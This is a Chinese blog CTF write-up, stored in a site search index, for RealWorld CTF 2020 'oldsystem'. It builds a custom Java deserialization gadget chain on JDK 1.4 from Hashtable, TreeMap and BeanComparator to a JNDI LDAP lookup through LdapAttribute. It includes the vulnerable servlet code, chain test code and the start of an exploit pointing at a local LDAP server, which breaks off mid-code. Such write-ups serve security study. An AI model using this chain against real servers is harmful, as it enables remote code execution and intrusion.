<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JAVA反序列化题目-RealWorld CTF 2020 oldsystem</title>
    <link href="/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-RealWorld-CTF-2020-oldsystem/"/>
    <url>/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-RealWorld-CTF-2020-oldsystem/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA反序列化题目-RealWorld-CTF-2020-oldsystem"><a href="#JAVA反序列化题目-RealWorld-CTF-2020-oldsystem" class="headerlink" title="JAVA反序列化题目-RealWorld CTF 2020 oldsystem"></a>JAVA反序列化题目-RealWorld CTF 2020 oldsystem</h1><h2 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h2><p>1.题目的jdk版本是1.4</p><p>存在的类和库</p><p><img src="https://i.loli.net/2021/02/15/7wI9VdWTSnrxG6s.png"></p><p>看到<code>commons-collections</code>和<code>commons-beautils</code>就想到了反序列化</p><p>看到<code>web.xml</code>，存在一个路由<code>/object</code></p><p><img src="https://i.loli.net/2021/02/15/R3Yu5CmESP1986B.png"></p><p>看到<code>org.rwctf.ObjectServlet</code>，它继承了<code>HttpServlet</code>,在它的<code>init</code>方法中，定义了一个<code>appClassLoader</code>，限制了只能加载项目中的类，这里应该是让我们无法加载tomcat的全局依赖库（在上次的shiro反序列化中学到了tomcat和项目的依赖库是不一样的,jdk版本也是可以不一样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig var1)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>    <span class="hljs-keyword">super</span>.init(var1);<br>    String var2 = var1.getServletContext().getRealPath(<span class="hljs-string">&quot;/&quot;</span>);<br>    File var3 = <span class="hljs-keyword">new</span> File(var2 + File.separator + <span class="hljs-string">&quot;WEB-INF&quot;</span> + File.separator + File.separator + <span class="hljs-string">&quot;lib&quot;</span>);<br>    <span class="hljs-keyword">if</span> (var3.exists() &amp;&amp; var3.isDirectory()) &#123;<br>        File[] var4 = var3.listFiles();<br>        <span class="hljs-keyword">if</span> (var4 != <span class="hljs-keyword">null</span>) &#123;<br>            URL[] var5 = <span class="hljs-keyword">new</span> URL[var4.length + <span class="hljs-number">1</span>];<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var6 = <span class="hljs-number">0</span>; var6 &lt; var4.length; ++var6) &#123;<br>                <span class="hljs-keyword">if</span> (var4[var6].getName().endsWith(<span class="hljs-string">&quot;.jar&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var5[var6] = var4[var6].toURI().toURL();<br>                    &#125; <span class="hljs-keyword">catch</span> (MalformedURLException var9) &#123;<br>                        var9.printStackTrace();<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            File var10 = <span class="hljs-keyword">new</span> File(var2 + File.separator + <span class="hljs-string">&quot;WEB-INF&quot;</span> + File.separator + File.separator + <span class="hljs-string">&quot;classes&quot;</span>);<br>            <span class="hljs-keyword">if</span> (var10.exists() &amp;&amp; var10.isDirectory()) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var5[var5.length - <span class="hljs-number">1</span>] = var10.toURI().toURL();<br>                &#125; <span class="hljs-keyword">catch</span> (MalformedURLException var8) &#123;<br>                    var8.printStackTrace();<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">this</span>.appClassLoader = <span class="hljs-keyword">new</span> URLClassLoader(var5);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>再看到他的<code>doPost</code>方法，可以很明显看到存在<code>readObject</code>，反序列化无疑了，但是看到他的<code>ObjectInputStream</code>是自己实现的，看看它有什么变化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    PrintWriter var3 = var2.getWriter();<br>    ClassLoader var4 = Thread.currentThread().getContextClassLoader();<br>    Thread.currentThread().setContextClassLoader(<span class="hljs-keyword">this</span>.appClassLoader);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        ClassLoaderObjectInputStream var5 = <span class="hljs-keyword">new</span> ClassLoaderObjectInputStream(<span class="hljs-keyword">this</span>.appClassLoader, var1.getInputStream());<br>        Object var6 = var5.readObject();<br>        var5.close();<br>        var3.print(var6);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var10) &#123;<br>        var10.printStackTrace(var3);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        Thread.currentThread().setContextClassLoader(var4);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>ClassLoaderObjectInputStream</code> 可以看到也没什么像添加黑名单，白名单的地方，只是定义了classLoader是上述规定的<code>URLClassLoader</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoaderObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectInputStream</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ClassLoader classLoader;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ClassLoaderObjectInputStream</span><span class="hljs-params">(ClassLoader var1, InputStream var2)</span> <span class="hljs-keyword">throws</span> IOException, StreamCorruptedException </span>&#123;<br>        <span class="hljs-keyword">super</span>(var2);<br>        <span class="hljs-keyword">this</span>.classLoader = var1;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> Class <span class="hljs-title">resolveClass</span><span class="hljs-params">(ObjectStreamClass var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">return</span> Class.forName(var1.getName(), <span class="hljs-keyword">false</span>, <span class="hljs-keyword">this</span>.classLoader);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> Class <span class="hljs-title">resolveProxyClass</span><span class="hljs-params">(String[] var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        Class[] var2 = <span class="hljs-keyword">new</span> Class[var1.length];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var3 = <span class="hljs-number">0</span>; var3 &lt; var1.length; ++var3) &#123;<br>            var2[var3] = Class.forName(var1[var3], <span class="hljs-keyword">false</span>, <span class="hljs-keyword">this</span>.classLoader);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> Proxy.getProxyClass(<span class="hljs-keyword">this</span>.classLoader, var2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>因此这道题就是要我们利用题目给的库触发反序列化RCE，那么<code>commons-collections</code>和<code>commons-beautils</code>这两个库就应该是重点关注对象了，先看看<code>commons-collections</code></p><p>版本是<code>2.1</code>，不满足<code>ysoserial</code>中的<code>3.1</code>和<code>4.0</code>，那要看看库里有没有形成反序列化漏洞的类</p><p><img src="https://i.loli.net/2021/02/15/ghMQpozwCv6kDAR.png"></p><p>首先是各种的<code>transformer</code></p><p>找到一个调用<code>tranform</code>方法的类，它有一个<code>Transformer</code>属性，看到接口类</p><p><img src="https://i.loli.net/2021/02/15/x17dLikt3e5FYGg.png"></p><p>查找他的实现类，无果</p><p><img src="https://i.loli.net/2021/02/15/1sfYIw7xTnrLBHS.png"></p><p><img src="https://i.loli.net/2021/02/15/ixwscTNP87ASvpe.png"></p><p>那么<code>commons-collections</code>的链就相当于断了（起码根据ysoserial的gadget来说，但也说不定还有没挖出来的gadget</p><p>把目光放在<code>commons-beautils</code>,版本是<code>1.6</code>，也比<code>ysoserial</code>中的<code>1.9</code>要低</p><p><img src="https://i.loli.net/2021/02/15/ui9efBQqMZGIUXt.png"></p><p>但是一眼就看到了gadget里需要用到的一个类，这就是一个好的开始（x</p><p><img src="https://i.loli.net/2021/02/15/4EMxkGdLna6cA5O.png"></p><p>两个版本中<code>BeanComparator#compare</code>的区别只是1.9中多了几个报错的类型，因此它应该也可以获取某个类的无参get方法，然后形成进一步的利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    #####1.9<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">( T o1, T o2 )</span> </span>&#123;<br><br>        <span class="hljs-keyword">if</span> ( property == <span class="hljs-keyword">null</span> ) &#123;<br>            <span class="hljs-comment">// compare the actual objects</span><br>            <span class="hljs-keyword">return</span> internalCompare( o1, o2 );<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Object value1 = PropertyUtils.getProperty( o1, property );<br>            Object value2 = PropertyUtils.getProperty( o2, property );<br>            <span class="hljs-keyword">return</span> internalCompare( value1, value2 );<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( IllegalAccessException iae ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( InvocationTargetException ite ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( NoSuchMethodException nsme ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );<br>        &#125;<br>    &#125;<br>#####1.6<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Object o1, Object o2)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Object value1 = PropertyUtils.getProperty(o1, <span class="hljs-keyword">this</span>.property);<br>            Object value2 = PropertyUtils.getProperty(o2, <span class="hljs-keyword">this</span>.property);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.comparator.compare(value1, value2);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ClassCastException(var5.toString());<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>但是不幸的是，jdk1.4中既不存在<code>PriorityQueue</code>也不存在<code>TemplatesImpl</code>,导致无法直接用<code>ysoserial</code>的gadget</p><p>那么这道题的考点就是 自己挖出一条gadget出来</p><p>而现在有了中间的一个点，需要找到反序列化的入口和反序列化的触发点</p><h3 id="前半条链"><a href="#前半条链" class="headerlink" title="前半条链"></a>前半条链</h3><p>按照<code>ysoserial</code>的思路，我们需要找到一个队列，它在反序列化时会对队列中的属性进行<code>compare</code>，而它的<code>comparator</code>又是可以指定的，如果能找到这样的代替品，就能找到反序列化的入口</p><p>全局搜索<code> comparator.compare</code>，定位到<code>TreeMap</code>,首先它可以被反序列化，再在类中查找一下调用<code>compare</code>的地方，几乎每个方法都调用了<code>compare</code></p><p><img src="https://i.loli.net/2021/02/15/wTtFulNBgihVEpm.png"></p><p>先看看<code>getEntry</code>,这里的<code>Entry </code>,是<code>TreeMap</code>中用来存数据的地方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> Entry <span class="hljs-title">getEntry</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    Entry p = root;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">int</span> cmp = compare(key,p.key);<br>        <span class="hljs-keyword">if</span> (cmp == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> p;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmp &lt; <span class="hljs-number">0</span>)<br>            p = p.left;<br>        <span class="hljs-keyword">else</span><br>            p = p.right;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br>    Entry(Object key, Object value, Entry parent) &#123; <br>        <span class="hljs-keyword">this</span>.key = key;<br>        <span class="hljs-keyword">this</span>.value = value;<br>        <span class="hljs-keyword">this</span>.parent = parent;<br>    &#125;<br></code></pre></td></tr></table></figure><p>再看调用<code>getEntry</code>的地方，第一个是<code>containsKey</code>，在它的父类<code>AbstractMap</code>中看到了调用<code>containsKey</code>的方法,但是他要求<code>value的值为null</code></p><p><code>AbstractMap#equals</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>Map t = (Map) o;<br><span class="hljs-keyword">if</span> (t.size() != size())<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           Iterator i = entrySet().iterator();<br>           <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>               Entry e = (Entry) i.next();<br>               Object key = e.getKey();<br>               Object value = e.getValue();<br>               <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>                   <span class="hljs-keyword">if</span> (!(t.get(key)==<span class="hljs-keyword">null</span> &amp;&amp; t.containsKey(key)))<br>                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">if</span> (!value.equals(t.get(key)))<br>                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>               &#125;<br>           &#125;<br></code></pre></td></tr></table></figure><p>可是调试期间发现<code>get</code>也能触发<code>getEntry</code>,那就无所谓用哪个触发<code>getEntry</code>了</p><p><img src="https://i.loli.net/2021/02/15/w7DG4KgkvpPmthe.png"></p><p>那么现在要找的是调用<code>equals</code>的地方</p><p>在<code>map.java</code>中看到了有这些类，然后在<code>Hashtable</code>中的<code>readObject</code>我发现了可利用的地方</p><p><img src="https://i.loli.net/2021/02/15/6R7su85ApNiSjqM.png"></p><p><code>Hashtable#readObject</code>，它调用了<code>put</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br><span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>    Object key = s.readObject();<br>    Object value = s.readObject();<br>    put(key, value);  <span class="hljs-comment">// synch could be eliminated for performance</span><br>&#125;<br></code></pre></td></tr></table></figure><p>而<code>put</code>中就调用了<code>equals</code></p><p><img src="https://i.loli.net/2021/02/15/5ykHW7sNMIiROlx.png"></p><p>测试了一下，确实可以调用到<code>TreeMap#get</code></p><p><img src="https://i.loli.net/2021/02/15/T2rZW6D4w5Cz3eB.png"></p><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test2</span> </span>&#123;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException, IOException </span>&#123;<br>BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;class&quot;</span>);<br>TreeMap tree1 = <span class="hljs-keyword">new</span> TreeMap(comparator);<br>tree1.put(TreeMap.class, <span class="hljs-keyword">null</span>);<br>TreeMap tree2 = <span class="hljs-keyword">new</span> TreeMap(comparator);<br>tree2.put(TreeMap.class, <span class="hljs-keyword">null</span>);<br>Hashtable hm = <span class="hljs-keyword">new</span> Hashtable();<br>hm.put(tree1, <span class="hljs-string">&quot;aaa&quot;</span>);<br>hm.put(tree2, <span class="hljs-string">&quot;bbb&quot;</span>);<br>FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;output/treemap1.bin&quot;</span>);<br>ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>oos.writeObject(hm);<br>FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;output/treemap1.bin&quot;</span>);<br>ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>Hashtable tr = (Hashtable)ois.readObject();<br>System.out.println(tr);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>那么前半条链就找出来了</p><h3 id="后半条链"><a href="#后半条链" class="headerlink" title="后半条链"></a>后半条链</h3><p>这半段实在是找不出来，就记录一下writeup的思路吧</p><p>找到的触发点是</p><p><code>com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> DirContext <span class="hljs-title">getAttributeDefinition</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    DirContext var1 = <span class="hljs-keyword">this</span>.getBaseCtx().getSchema(<span class="hljs-keyword">this</span>.rdn);<br>    <span class="hljs-keyword">return</span> (DirContext)var1.lookup(<span class="hljs-string">&quot;AttributeDefinition/&quot;</span> + <span class="hljs-keyword">this</span>.getID());<br>&#125;<br></code></pre></td></tr></table></figure><p>它调用了<code>getBaseCtx</code>,用其来新建一个<code>InitialDirContext</code>,而且他的<code>java.naming.provider.url</code>可控，就相当于可以控制 JNDI 的连接地址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> DirContext <span class="hljs-title">getBaseCtx</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.baseCtx == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.baseCtxEnv == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">this</span>.baseCtxEnv = <span class="hljs-keyword">new</span> Hashtable(<span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">this</span>.baseCtxEnv.put(<span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>, <span class="hljs-string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span>);<br>        <span class="hljs-keyword">this</span>.baseCtxEnv.put(<span class="hljs-string">&quot;java.naming.provider.url&quot;</span>, <span class="hljs-keyword">this</span>.baseCtxURL);<br>        <span class="hljs-keyword">this</span>.baseCtx = <span class="hljs-keyword">new</span> InitialDirContext(<span class="hljs-keyword">this</span>.baseCtxEnv);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.baseCtx;<br>&#125;<br></code></pre></td></tr></table></figure><p>这时只要能调用<code>lookup</code>，就能触发<code>ldap</code>的反序列化攻击</p><p>看到<code>lookup</code>的调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.naming</span>.InitialContext<span class="hljs-selector-id">#lookup</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.url</span><span class="hljs-selector-class">.ldap</span>.ldapURLContext<span class="hljs-selector-id">#lookup</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.url</span>.GenericURLContext<span class="hljs-selector-id">#lookup</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.PartialCompositeContext<span class="hljs-selector-id">#lookup</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.ComponentContext#p_lookup<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.ldap</span>.LdapCtx#c_lookup<br></code></pre></td></tr></table></figure><p>发现只要能调用<code>com.sun.jndi.ldap.LdapCtx#c_lookup</code>，就能触发，而在刚才的<code>getSchema</code>方法中，最终就能调用<code>com.sun.jndi.ldap.LdapCtx#c_lookup</code>,因此最终的半条链也完成了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.ldap</span>.LdapAttribute#getAttributeDefinition<br>-&gt; javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.directory</span>.InitialDirContext<span class="hljs-selector-id">#getSchema</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.PartialCompositeDirContext<span class="hljs-selector-id">#getSchema</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.ComponentDirContext#p_getSchema<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.ComponentContext#p_resolveIntermediate<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.AtomicContext#c_resolveIntermediate_nns<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.ComponentContext#c_resolveIntermediate_nns<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.ldap</span>.LdapCtx#c_lookup<br></code></pre></td></tr></table></figure><p>最后的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test2</span> </span>&#123;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException, IOException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvalidNameException </span>&#123;<br>String ldapCtxUrl = <span class="hljs-string">&quot;ldap://127.0.0.1:1389&quot;</span>;<br>        Class ldapAttributeClazz = Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(<br><span class="hljs-keyword">new</span> Class[] &#123;String.class&#125;);<br>        